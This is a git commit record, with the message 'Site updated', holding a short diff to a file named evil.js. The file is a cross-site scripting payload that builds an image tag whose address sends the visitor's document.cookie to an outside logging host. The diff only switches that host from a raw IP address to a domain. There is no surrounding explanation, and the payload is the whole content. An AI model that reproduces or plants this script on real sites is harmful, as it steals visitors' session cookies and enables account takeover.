45000bee50f7a6017b8de8d07dcdfb0fcc4517a6
Wooooooooooooow <3170105063@zju.edu.cn>
2020-01-15 12:37:08 +0800

    Site updated: 2020-01-15 12:37:08

--- evil.js
+++ evil.js
@@ -1,3 +1,3 @@
 var img = document.createElement("img");
-img.src = "http://139.180.130.56/log?"+escape(document.cookie);
+img.src = "http://n0nop.com/log?"+escape(document.cookie);
 document.body.appendChild(img);
